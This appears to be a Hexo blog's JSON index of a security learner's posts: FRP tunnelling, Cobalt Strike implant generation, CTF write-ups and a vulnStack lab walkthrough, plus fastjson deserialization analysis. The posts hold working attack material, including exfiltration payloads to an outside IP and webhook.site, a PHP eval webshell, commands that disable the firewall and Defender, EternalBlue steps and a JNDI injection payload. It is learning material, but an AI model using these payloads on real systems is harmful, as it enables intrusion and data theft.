{"meta":{"title":"k4i_x3i0's blog","subtitle":"","description":"k4i_x3i0,一个热衷于web安全的大菜鸡","author":"k4i_x3i0","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2023-07-04T17:19:16.000Z","updated":"2023-07-04T17:40:57.886Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"test1","date":"2023-07-04T17:21:02.000Z","updated":"2023-07-04T17:21:02.971Z","comments":true,"path":"test1/index.html","permalink":"http://example.com/test1/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-07-04T17:26:38.000Z","updated":"2023-07-04T17:28:19.572Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":"testtags"}],"posts":[{"title":"Frp基操","slug":"Frp基操","date":"2023-06-21T14:18:17.000Z","updated":"2023-08-02T03:29:27.009Z","comments":true,"path":"2023/06/21/Frp基操/","link":"","permalink":"http://example.com/2023/06/21/Frp%E5%9F%BA%E6%93%8D/","excerpt":"","text":"端口转发模拟环境： 本地win11开启web服务模拟内网机器，kali模拟已经拿到shell的linux靶机。 需求：将内网win11的服务转发到公网上，让攻击者能够直接访问 服务端设置 （放vps运行） 1234567891011[common] bind_port = 10000 dashboard_port = 10050 dashboard_user = admindashboard_pwd = adminenable_prometheus = truevhost_http_port = 8087 #http服务要在服务端设置log_file = ./log/frps.loglog_level = infolog_max_days = 3 客户端设置 (在kali中运行) 12345678910111213141516[common]server_addr = vpsIPserver_port = 10000user = k4[web]type = httpuse_compression = truelocal_ip = 10.254.2.55custom_domains = vpsIPlocal_port = 8087remote_port = 8087log_file = ./log/frpc.loglog_level = debug 能够拿到win的shell，太危险辣，没事就别挂本机的，小心学习资料暴露(狗头) frp使用 12345#后台运行frp后台./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp; #启动ps -aux|grep frp| grep -v grep #关闭（杀进程）root 3600 0.1 0.1 110188 9484 pts/0 Sl 15:04 0:00 ./frpc -c ./frpc.ini kill -9 3600 还可以配合利用systemctl来控制启动 内网穿透上面实例只是将本地的单个端口转发到了公网上，但是渗透环境中需要将内网环境带出来。这样子就需要搭建一个反向代理：代理服务器接收internet的请求，然后将请求转发给内部网络的服务器，并将从内网服务器返回的结果返回给internet上请求连接的客户端 FRPFrp服务端 1./frps -c ./frps.ini 123456789[common]Bind_addr = 0.0.0.0 bind_port = 7000 dashboard_port = 7500 dashboard_user = admin dashboard_pwd = admin allow_ports = 40000-50000 Frp客户端 1./frpc -c ./frpc.ini 1234567891011121314[common]server_addr = vpsIPserver_port = 7000 tls_enable = ture pool_count = 5 [socks5]type = tcpremote_port = 46075plugin = socks5plugin_user = adminplugin_passwd = adminuse_encryption = trueuse_compression = true Proxifier设置好代理后即可访问 Frp部分参数12345678910111213Bind_addr = 0.0.0.0 #服务端监听地址 默认0.0.0.0bind_port = 7000 #服务端监听端口dashboard_port = 7500 #状态以及代理统计信息展示,vpsip:7500可查看详情dashboard_user = admin #访问用户dashboard_pwd = password # dashboard_pwd访问密码log_file = ./frps.log #log_file日志文件log_level = info # log_level记录的日志级别log_max_days = 3 # log_max_days日志留存3天authentication_timeout = 0 #authentication_timeout超时时间max_pool_count最大链接池,每个代理预先与后端服务器建立起指定数量的最大链接数max_pool_count = 50allow_ports = 40000-50000 #允许代理绑定的服务端端口 参考 https://gofrp.org/docs/faq/ https://blog.csdn.net/qq_42335264/article/details/83584367 https://www.cnblogs.com/hackmang/p/14516969.html","categories":[{"name":"RedTeam","slug":"RedTeam","permalink":"http://example.com/categories/RedTeam/"}],"tags":[{"name":"RedTeam","slug":"RedTeam","permalink":"http://example.com/tags/RedTeam/"}]},{"title":"CobaltStrike基操","slug":"CobaltStrike基操","date":"2023-06-20T04:01:14.000Z","updated":"2023-08-01T13:17:11.664Z","comments":true,"path":"2023/06/20/CobaltStrike基操/","link":"","permalink":"http://example.com/2023/06/20/CobaltStrike%E5%9F%BA%E6%93%8D/","excerpt":"","text":"前言：最近和大哥们打了下红队，发现很多工具虽然知道，都还不是很熟悉。准备熟悉下这些工具的使用，这里只简单介绍了cs的上线方法，更多其他操作可以翻阅文档 启动服务端1./teamserver ip passwd //端口默认为50050 默认CS端口比较危险，若是泄露可能被他人登录。密码爆破脚本：https://github.com/ryanohoro/csbruter 修改端口方法：在teamserver中修改 客户端打开直接连接，用户名随便写 生成后门windows创建监听器 生成后门：选择刚刚创建的监听器即可 然后将生成的马传进目标靶机，运行即可。这里看到已经上现 ###linux CS默认是没有生成linux后门的功能的，需要下载插件CrossC2 项目地址：https://github.com/gloxec/CrossC2/releases 根据使用操作系统下载，其中CrossC2-GithubBot-2023-03-27.cna都要下载 下载后，修改CrossC2-GithubBot-2023-03-27.cna中的路径 然后进入CS选择添加脚本，就添加刚刚的CrossC2-GithubBot-2023-03-27.cna文件即可。 最后就是创建监听器，监听器需要选择https的 然后生成linux后门，（没有添加脚本的话是没有这个选项的） 注意.cobaltstrike.beacon_keys文件是服务端里的 除此之外还可以直接生后门 1./genCrossC2.Linux 192.168.50.123 443 .cobaltstrike.beacon_keys null Linux x64 /tmp/LinuxShell build生成后，把马传进目标靶机执行即可上线 其他操作CS还有许多功能，上面写的只是如何上线。各种攻击方法可以参考文档 https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html","categories":[{"name":"RedTeam","slug":"RedTeam","permalink":"http://example.com/categories/RedTeam/"}],"tags":[{"name":"RedTeam","slug":"RedTeam","permalink":"http://example.com/tags/RedTeam/"}]},{"title":"2023.5.3-6.1刷题日记","slug":"2023-5-3-6-1刷题日记","date":"2023-05-03T14:10:14.000Z","updated":"2023-08-01T13:17:21.311Z","comments":true,"path":"2023/05/03/2023-5-3-6-1刷题日记/","link":"","permalink":"http://example.com/2023/05/03/2023-5-3-6-1%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/","excerpt":"","text":"5.3D^3CTF复现，D^3开始那晚看了下题，java,go没有思路就跑路了，后面才知道上了些其他题，貌似比第一轮的简单，趁着环境没关，复现一下 Escape Plan123456789101112131415161718192021222324252627282930313233343536373839import base64from flask import Flask, requestapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def challenge_3(): cmd = request.form.get(&quot;cmd&quot;, &quot;&quot;) if not cmd: return &quot;&quot;&quot;&lt;pre&gt;import requests, base64exp = &#x27;&#x27;requests.post(&quot;&quot;, data=&#123;&quot;cmd&quot;: base64.b64encode(exp.encode())&#125;).text&lt;/pre&gt;&quot;&quot;&quot; try: cmd = base64.b64decode(cmd).decode() except Exception: return &quot;bad base64&quot; black_char = [ &quot;&#x27;&quot;, &#x27;&quot;&#x27;, &#x27;.&#x27;, &#x27;,&#x27;, &#x27; &#x27;, &#x27;+&#x27;, &#x27;__&#x27;, &#x27;exec&#x27;, &#x27;eval&#x27;, &#x27;str&#x27;, &#x27;import&#x27;, &#x27;except&#x27;, &#x27;if&#x27;, &#x27;for&#x27;, &#x27;while&#x27;, &#x27;pass&#x27;, &#x27;with&#x27;, &#x27;assert&#x27;, &#x27;break&#x27;, &#x27;class&#x27;, &#x27;raise&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, ] for char in black_char: if char in cmd: return f&#x27;failed: `&#123;char&#125;`&#x27; msg = &quot;success&quot; try: eval(cmd) except Exception: msg = &quot;error&quot; return msg 考点：python的代码执行，思路不难，但是传进去的参数存在黑名单过滤，需绕过，这点比较麻烦 要执行的代码： 123456789import socket, osflag = os.popen(&quot;whoami&quot;).read().encode()print(flag)host = &quot;120.48.123.181&quot;port=7777s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, port))s.sendall(flag)s.close() 本地测试执行的是whoami，靶机直接改为/readflag即可 接下来就是绕过过滤： 方法参考这篇文章，Python 沙箱逃逸的通解探索之路 | CN-SEC 中文网。其中eval被过滤了，可以用ᵉval绕过 12345678910111213141516171819202122232425262728本地测试demo:import base64u = &#x27;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#x27;cmd1=&#x27;X19pbXBvcnRfXygnb3MnKS5wb3Blbignd2hvYW1pJykucmVhZCgp=&#x27;# rce =b&#x27;&#x27;&#x27;__import__(&#x27;os&#x27;).popen(&#x27;python -c &quot;import socket, os; flag = os.popen(\\\\&quot;whoami\\\\&quot;).read().encode();host = \\\\&quot;120.48.123.181\\\\&quot;;port=7777;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host, port));s.sendall(flag);s.close();a=1;&quot;&#x27;).read()&#x27;&#x27;&#x27;# cmd1=str(base64.b64encode(rce)).strip(&quot;b&quot;).strip(&quot;&#x27;&quot;)CMD = &quot;ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(&#123;&#125;()))[len([])]))&quot;.format(cmd1)CMD = CMD.translate(&#123;ord(str(i)): u[i] for i in range(10)&#125;)cmd=base64.b64encode(CMD.encode())try: cmd = base64.b64decode(cmd).decode()except Exception: print(&quot;bad base64&quot;)black_char = [ &quot;&#x27;&quot;, &#x27;&quot;&#x27;, &#x27;.&#x27;, &#x27;,&#x27;, &#x27; &#x27;, &#x27;+&#x27;, &#x27;__&#x27;, &#x27;exec&#x27;, &#x27;eval&#x27;, &#x27;str&#x27;, &#x27;import&#x27;, &#x27;except&#x27;, &#x27;if&#x27;, &#x27;for&#x27;, &#x27;while&#x27;, &#x27;pass&#x27;, &#x27;with&#x27;, &#x27;assert&#x27;, &#x27;break&#x27;, &#x27;class&#x27;, &#x27;raise&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;,]for char in black_char: if char in cmd: print(f&#x27;failed: `&#123;char&#125;`&#x27;)try: print(eval(cmd))except Exception: msg = &quot;error&quot; way2: https://fq6p9pyo5tt.feishu.cn/docx/InUFdQUKdozf8yx5IhGcf5zInSe 利用dnslog,执行命令 12ping -c 1 `whoami`.mmfudk.dnslog.cn__import__(&#x27;os&#x27;).popen(&#x27;ping -c 1 `whoami`.mmfudk.dnslog.cn&#x27;) 禁用字母，使用全角符号绕过 禁用数字，使用 len(black_list) len([]) 拿到 repr(request) 拿到字符串，再使用数组切片进行截取 ###TAMUctf 2023-Blackbox 比赛的时候没做出来，伪造cookie一直没成功,来复现一下 做的时候直接发现存在文件包含，但没有发现还存在git泄露。因此还有amin.php和login.php这个俩个文件没读出来，关键的数据库文件也没弄出来，当时就是一直找不到key，无法伪造。把git泄露给忘了，没去试 找到key，关键！！！！ 1echo hash(&#x27;md5&#x27;, &#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;.&#x27;eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9rZXkiOiIyNmNlYjY4NWY0NmU2ZDIyIiwiYWRtaW4iOnRydWV9&#x27;); 1eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9rZXkiOiIyNmNlYjY4NWY0NmU2ZDIyIiwiYWRtaW4iOnRydWV9.d2ec4eaeee55b446bcd7ce38c4de754f 5.4复现下taum中没有看的题 ###taum203-migraine 题目给出源码，是一个js的代码审计 12345678910111213141516171819202122232425262728293031323334353637const path = require(&#x27;path&#x27;);const express = require(&quot;express&quot;);const app = express();const port = 8000;app.use(express.json());process.on(&#x27;uncaughtException&#x27;, (err, origin) =&gt; &#123; console.log(err);&#125;);app.get(&quot;/&quot;, function (req, res) &#123; res.sendFile(path.join(__dirname+&#x27;/static/index.html&#x27;));&#125;);app.post(&quot;/&quot;, function (req, res) &#123; var src = req.body[&#x27;src&#x27;]; if (src.match(/[A-Za-z0-9]/) != null) &#123; res.status(418).end(&#x27;Bad character detected.&#x27;); return; &#125; try &#123; eval(src); &#125; catch(err) &#123; res.status(418).end(&#x27;Error on eval.&#x27;); return; &#125; res.status(200).send(&#x27;Success!&#x27;); return;&#125;);app.listen(port, function () &#123; console.log(`Example app listening on port $&#123;port&#125;!`);&#125;); 一个js的代码执行，ban了数字和字母。但是js是可以直接执行jsfuck的，将我们需要的代码转换为jsfuck执行， 12//来自rain师傅的payload，还没用过webhook.site，学到了process.mainModule.require(&#x27;http&#x27;).request(&#123;hostname: &#x27;webhook.site&#x27;,path: &#x27;/6a551568-cf4e-4cb8-a4ec-47b7c5073f9c&#x27;,method: &#x27;POST&#x27;,headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,&#x27;Content-Length&#x27;: process.mainModule.require(&#x27;fs&#x27;).readFileSync(&#x27;/flag.txt&#x27;).toString().length&#125;&#125;).write(process.mainModule.require(&#x27;fs&#x27;).readFileSync(&#x27;/flag.txt&#x27;).toString()) ###TAUM2023-Lost and Forgotten 测了半天，没发现考的啥，看样子还以为是某个cve。看了wp才发现是个sql，做的时候根本没往sql这方面想 测试出来不能用order by 6,会报502，只能挨个测试 1t&#x27; union select table_name,2,3,4,5,6 from information_schema.tables# //这里能查到很多表名，根据提示wp在文章中，所以去articles中找 1t&#x27; union select column_name,2,3,4,5,6 from information_schema.columns where table_name =&#x27;articles&#x27;# 不知道flag在哪一个，就都查了 1query=t&#x27; union select access_code,artloc,imgloc,descr,postdate,title from articles# 5.5今天事比较多，就搞了一题，buu随便找的，签到题，练练手吧，不能断！！！ ###[WUSTCTF2020]CV Maker 注册登录进去后是一个比较显眼的上传点 测试上传1.php， 该函数会检测文件类型，加文件幻术头即可绕过 5.6d3没打，来复现d3中的题目 d3cloudadmin/admin进入后台。 存在laravel-admin-extensions/media-manager插件，改插件中 发下存在插件 1234567891011121314151617181920public function putFileAs($path, $file, $name, $options = []) &#123; $supported_file = array(&#x27;gif&#x27;,&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;,&#x27;ico&#x27;,&#x27;zip&#x27;,&#x27;mp4&#x27;,&#x27;mp3&#x27;,&#x27;mkv&#x27;,&#x27;avi&#x27;,&#x27;txt&#x27;); $file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION)); if (!in_array($file_type, $supported_file)) &#123; return false; &#125; $stream = fopen($file-&gt;getRealPath(), &#x27;r+&#x27;); $result = $this-&gt;put( $path = trim($path.&#x27;/&#x27;.$name, &#x27;/&#x27;), $stream, $options ); if (is_resource($stream)) &#123; fclose($stream); &#125; if($file-&gt;getClientOriginalExtension() === &quot;zip&quot;) &#123; $fs = popen(&quot;unzip -oq &quot;. $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix() . $name .&quot; -d &quot; . $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix(),&quot;w&quot;); pclose($fs); &#125; return $result ? $path : false; &#125; 其中popen这存在命令注入，将文件名拼接再执行的命令里，可以通过闭合拼接的方式来进行注入，从而执行命令 1$fs = popen(&quot;unzip -oq &quot;. $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix() . $name .&quot; -d &quot; . $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix(),&quot;w&quot;); ###ISCC实战题 没结束就不放出来了 实习二面笔试题这里也不方便放出，目前拿到root权限，明早继续，冲内网 5.7继续笔试题，暂时不放出wp 继昨天的环境，内网存在两台机器，msf上线内网信息收集的时候出了问题，搞了好久 beescms，存在历史漏洞，但是没弱口令，要通过sql注入修改管理员密码 。。。。。 后面遇到很多事情，自己还有许多东西要搞，没时间每天抽时间刷题（主要是不想刷水题，难题又很花时间），就取消了这个这个刷题计划。后续ctf方面就参加每次的比赛来练习一下","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"渗透取经-vulStack1","slug":"渗透取经-vulStack1","date":"2023-04-25T14:24:49.000Z","updated":"2023-04-25T14:31:10.988Z","comments":true,"path":"2023/04/25/渗透取经-vulStack1/","link":"","permalink":"http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/","excerpt":"","text":"vulnStack-1 前言：学学渗透，春秋云镜太贵辣，尝试下红日靶场，还没有打穿。。。。。 靶场搭建官网下载虚拟机环境：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ 靶场搭建过程参考： https://blog.csdn.net/weixin_39190897/article/details/118353886 该靶场的网络拓扑图： 遇到的问题1，win7无法开启phpstudy，重启试过也不行 解决方法，手动开启apache和mysql 开启apache 12345进入C:\\phpStudy\\Apache\\bin执行这两条命令httpd.exe -k installhttpd.exe -k -n apache2.4 开启mysql 1234进入：C:\\phpStudy\\MySQL\\bin执行：mysqld --defaults-file=&quot;C:/phpStudy/mysql/my.ini&quot; --console --skip-grant-tables 2，网络设置，攻击机需要与靶机在同一个网段，攻击机还要设置网关（我的win11就是因为没有设置网关而出问题，卡了半天） 访问web服务，成功搭建开始渗透： 外网渗透访问服务，是一个phpStudy 探针，可以测试链接mysql,账号密码是root，root。但是并没有什么卵用，dirsearch扫一下： 弱口令，root,root进入phpMyadmin 【https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label1_0】 利用phpMyadmin存在的漏洞来getShell： 尝试利用into outfile写入木马，该方法需要满下列条件： 当前的数据库用户有写权限 知道web绝对路径 web路径能写 SELECT @ @basedir 查看路径 执行`show variables like ‘%secure%’; 当secure_file_priv为NULL时，表示限制Mysql不允许导入导出，要想使得写入文件语句导出成功，则需要在Mysql文件夹下修改my.ini 文件，在[mysqld]内加入secure_file_priv =&quot;&quot; 即可，但是在phpMyadmin中无法修改my.ini文件，换！ 通过写入日志文件getshell 1234set global general_log = &quot;ON&quot;;show variables like &#x27;general%&#x27;;set global general_log_file = &quot;C://phpStudy//WWW//shell.php&quot;; //分隔符要使用，否则无法写入select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;; 这个给靶场还存在ycxcms也能getshell 内网渗透cs上线1，生成cs木马，蚁剑上传 先关闭防火墙 1netsh advfirewall set allprofiles state off 再执行木马程序： 稍等一会可以看到已经上线 拿到 shell 第一步，调低心跳值，默认心跳为 60s，执行命令的响应很慢，进入 beacon 执行 sleep 5 或者右键主机选择 会话→Sleep进行设置 2，信息收集： 网络信息 1shell ipconfig Minikatz抓本机用户密码，成功获取为Qwer1234 提权，利用 MS14-058 成功提权到 SYSTEM 系统权限账户。（看wp说的用这个洞来提权，但是我靶场搭建起来就是SYSTEM权限诶。先不管跟着打一遍） ###域环境信息收集 内网信息收集的主要目的就是查找域控以及域内的其他主机， 部分内网信息收集的命令： 123456789101112net view # 查看局域网内其他主机名net config Workstation # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域net user # 查看本机用户列表net user /domain # 查看域用户net localgroup administrators # 查看本地管理员组（通常会有域用户）net view /domain # 查看有几个域net user 用户名 /domain # 获取指定域用户的信息net group /domain # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）net group 组名 /domain # 查看域中某工作组net group &quot;domain admins&quot; /domain # 查看域管理员的名字net group &quot;domain computers&quot; /domain # 查看域中的其他主机名net group &quot;doamin controllers&quot; /domain # 查看域控制器主机名（可能有多台） 1，先判断是否存在域，使用 ipconfig /all 查看 DNS 服务器，发现主 DNS 后缀不为空，存在域god.org 2,查看有几个域（域环境可能存在多个域） 1net view /domain 发现只有一个域GOD 3，查看域控 1net group &quot;domain controllers&quot; /domain 直接确认域控主机的名称为 OWA 4,查看局域网内其他主机信息(主机名称、IP地址) 注：用cs中的net view可以直接查看到ip 1net view 执行命令net group &quot;domain computers&quot; /domain 查看域中的其他主机名 内网信息收集完毕： 域控：192.168.52.138 OWA 域成员：192.168.52.141（ROOT-TVI862UBEH），192.168.52.143 （STU1已经控制的机器） 注：扫描存活机器的时候还可以利用msf中的模块来探测 12345探测主机存活use post/windows/gather/arp_scannerset SESSION 1set RHOSTS 192.168.52.1-255run 内网横向渗透 以win7为调板机，横向渗透拿下域内成员及其域控 ###CS派生会话给公网MSF 启动msf，开启监听 12345use exploit/multi/handlerset payload windows/meterpreter/reverse_httpset lhost 192.168.14.128set lport 7777exploit CS开启监听： CS中添加会话，选择刚刚添加的监听器，转到msf这边可以看到已近收到了 msf功能强大，才学也不知可以干些什么。这里跟着师傅们的操作学学： 1234run post/windows/gather/checkvm #判断是否是虚拟机(检测是否进入了蜜罐)run post/windows/gather/enum_applications #枚举出靶机上的应用程序run post/multi/manage/autoroute #加载MSF的autoroute模块，获取当前机器的所有网段信息run post/multi/manage/autoroute SUBNET=192.168.52.0 ACTION=ADD #添加目标内网路由 可以看到已经检测出是虚拟机了 ###永恒之蓝攻击 利于msf是为了借助他的攻击模块，展开横向渗透，拿下域中其他机器。 ####静态路由配置 MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用 MSF 去访问原本不能直接访问的内网资源，只要路由可达我们既可使用 MSF 来进行探测了。 1，查看靶机网段信息 2，添加目标内网路由 ####MSF内网端口扫描 现在路由可达内网网段，可以先对内网主机进行探测。 1，使用auxiliary/scanner/portscan/tcp模块对192.168.52.141和192.168.52.138开放的端口进行扫描（这里要先推出当前模块，使用background命令，获取如果要返回使用sessions -i即可） 1234567#msf自带模块use auxiliary/scanner/portscan/tcpset rhosts 192.168.52.141set ports 80,135-139,445,3306,3389run#nmap，msf结合了nmap，可以直接里哟nmap来扫描 ####使用ms17-010进行攻击 1，使用MSF 自带的漏洞扫描模块进行扫描： 1234search ms17_010 #搜索MSF集成的与ms17_010漏洞相关的模块use auxiliary/scanner/smb/smb_ms17_010 # 加载扫描expset rhosts 192.168.52.141 #设置被扫描的主机IPrun #进行扫描，观察是否存在该漏洞 这发现都存在永恒之蓝漏洞 2，利于该漏洞拿下域控 关闭跳板机防火墙： 1234sessions -l #查看所有会话sessions 4 #进入会话4中netsh advfirewall set allprofiles state off #关闭防火墙net stop windefend #关闭Windows defender 1234use exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcpset rhosts 192.168.52.138run 报错，并没有把域控打蓝屏，也没有拿到shell。 根据报错，搜了下并没有解决问题，后面打开的时候莫名奇妙域环境中端口也不通了。暂时先了解下流程，后面多学点再来试试 知识点1，如何判断是否存在域环境 net config Workstation ：查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息 ipconfig /all ：查看 DNS 服务器，发现主 DNS 后缀不为空，存在域god.org 问题 计网知识掌握太少，对于一些操作为什么要去这样做不是很理解 域相关知识不了解 工具使用 CS MSF nmap 参考 https://blog.csdn.net/weixin_39190897/article/details/11835388 https://jwt1399.top/posts/24047.html","categories":[],"tags":[]},{"title":"fastjson漏洞分析-1224-68","slug":"fastjson漏洞分析-1224-68","date":"2023-04-16T19:12:04.000Z","updated":"2023-08-01T13:14:28.934Z","comments":true,"path":"2023/04/17/fastjson漏洞分析-1224-68/","link":"","permalink":"http://example.com/2023/04/17/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1224-68/","excerpt":"","text":"fastjson##简介 ​ fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁 特点 不需要实现Serializable接口 变量不需要不是transient，变量有对应的setter或者是public或者满足条件的getter sink 反射，动态类加载 版本限制，依赖限制，出网 原理JSON.toJSONString()，JSON.toJSONString(Object, SerializerFeature.WriteClassName); 将对象转换为json格式的字符串。 JSON.toJSONString()：普通转换 JSON.toJSONString(Object, SerializerFeature.WriteClassName)：其会将对象类型一起序列化并且会写入到@type字段中 JSON.parse()，JSON.parseObject() , JSON.parseObject(Srting,Class) 将json格式的字符串转换为对象。 parse会转换为@type指定的类，用parse反序列化时，调用set方法 parseObject会默认指定JSONObject类，parseObject反序列化时，调用了@type指定类的set和get方法 parseObject(Srting,Class)参数中加一个类参数则会转换为其指定的类（这里指定Object会自动转化为JSONObject）,parseObject(Srting,Class)反序列化时，调用了@type指定类的set方法 简单分析下demo 这里直接搬用了Da22le师傅的测试用例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778package com.example.fastjson;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class demo &#123; public static void main(String[] args) &#123; User user = new User(&quot;张三&quot;,18,&quot;game&quot;); String s1 = JSON.toJSONString(user); String s2 = JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(s1); System.out.println(s2); System.out.println(&quot;-----------------------------------------------------&quot;); Object parse = JSON.parse(s2); System.out.println(parse); System.out.println(parse.getClass().getName()); System.out.println(&quot;-----------------------------------------------------&quot;); Object parse1 = JSON.parseObject(s2); System.out.println(parse1); System.out.println(parse1.getClass().getName()); System.out.println(&quot;-----------------------------------------------------&quot;); Object parse2 = JSON.parseObject(s2,Object.class); System.out.println(parse2); System.out.println(parse2.getClass().getName()); &#125;&#125;class User &#123; private String name; private int age; private String hobby; public User() &#123; &#125; public User(String name, int age, String hobby) &#123; this.name = name; this.age = age; this.hobby = hobby; &#125; public String getName() &#123; System.out.println(&quot;调用了getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;调用了setName&quot;); this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getHobby() &#123; return hobby; &#125; public void setHobby(String hobby) &#123; this.hobby = hobby; &#125; @Override public String toString() &#123; return &quot;user&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&quot; + age + &quot;, hobby=&#x27;&quot; + hobby + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; 调用set方法：（具体调用流程看调用栈） 调用get方法： 在paseObject中会调用toJSON方法，其中toJSON里调用了get方法，具体看调用栈 @type作用？ 在com\\alibaba\\fastjson\\parser\\DefaultJSONParser.class中，获取到标识符@type赋给key 判断key是否是@type，JSON.DEFAULT_TYPE_KEY就是常量@type。接着在获取paylaod中引号包裹的下一位，即是@type后面跟着的字符串 - 指定加载的类 1.2.24pom.xml 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt;&lt;/dependency&gt; 漏洞利用： JdbcRowSetImpl TemplatesImpl fastjon中存在两条利用链 JdbcRowSetImpl在JdbcRowSetImpl#setAutoCommit中，setAutoCommit方法里调用了connect()方法，而在connect方法中可以调用lookup方法，即存在jndi注入漏洞 1JdbcRowSetImpl#setAutoCommit -&gt; connect -&gt; lookup JdbcRowSetImpl利用链测试demo 1234567891011package com.example.fastjson;import com.sun.rowset.JdbcRowSetImpl;public class lookupDemo &#123; public static void main(String[] args) throws Exception &#123; JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName(&quot;ldap://127.0.0.1:1389/mymwv2&quot;); jdbcRowSet.setAutoCommit(true); &#125;&#125; paylaod： 1JSON.parse(&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;rmi://127.0.0.1:1099/ckb7j7\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&quot;); ###TemplatesImpl fastjosn存在下例特性： 如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用Feature.SupportNonPublicField参数 fastjson 在为类属性寻找getter/setter方法时，调用函数com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()方法，会忽略_ -字符串 fastjson 在反序列化时，如果Field类型为byte[]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue进行base64解码，在序列化时也会进行base64编码 先来看一下TemplatesImpl的getOutputProperties方法，它是_outputProperties的getter方法， getOutputProperties中调用了newTransformer方法，跟进，跟进该方法 newTransformerImpl对象时会进入到getTransletInstance()中，在getTransletInstance方法中判断了_name和_class是否为空，如果_name!=null&amp;&amp;_class=null则会调用到defineTransletClasses()。在defineTransletClasses()中，通过for循环加载_bytecodes[]来加载类，其中_tfactory不为null，并且因为加载完类后会强制类型转换为AbstractTranslet，也就是说加载的类必须为AbstractTranslet的子类。 接下来会实例化_class[_transletIndex]并强制转为AbstractTranslet类型，其中_transletIndex=-1即实例化数组_class的第一位 还有一点就是，利用到的所有变量都为private,在反序列化的时候需要加上Feature.SupportNonPublicField参数 到这里就找到了整条利用链，总结下条件： fastjson反序列化时需有Feature.SupportNonPublicField参数 _bytecodes[]需进行base64编码 _bytecodes[]中加载的类需为AbstractTranslet的子类 _name != null _tfactory != null 测试：恶意类EvilClass 12345678910111213141516171819202122232425import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class EvilClass extends AbstractTranslet 